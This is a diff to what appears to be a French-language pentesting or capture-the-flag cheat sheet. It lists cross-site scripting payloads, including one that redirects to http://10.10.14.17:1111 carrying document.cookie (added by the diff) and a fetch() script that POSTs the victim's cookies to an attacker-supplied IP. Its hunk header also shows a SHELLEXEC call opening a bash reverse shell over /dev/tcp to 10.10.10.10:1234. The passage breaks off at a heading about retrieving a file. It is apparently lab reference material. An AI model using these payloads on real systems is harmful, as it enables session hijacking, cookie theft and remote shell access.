@@ -68,17 +68,18 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 - [Xss Payload](https://github.com/payloadbox/xss-payload-list) --> Payload XSS
 	- `<iframe src="javascript:alert('xss')">`
  	- `<script>alert(‘XSS’)</script>`
-    		- Cookie --> `</script><img src=1 onerror=alert(document.cookie)>` ou
+    		- Cookie -->
+    			- `</script><img src=1 onerror=alert(document.cookie)>` ou `<script>document.location='http://10.10.14.17:1111/?c='+document.cookie;</script>` ou Javascript :
     
-    ```javascript=
-    <script>
-    fetch('http://<<your-ip>>:9001/', {
-              method: 'POST',
-              mode: 'no-cors',
-              body:document.cookie
-        });
-	</script>
-    ```
+	    ```javascript=
+	    <script>
+	    fetch('http://<<your-ip>>:9001/', {
+	              method: 'POST',
+	              mode: 'no-cors',
+	              body:document.cookie
+	        });
+		</script>
+	    ```
 
     - Pour récupérer un fichier :
      ```javascript=
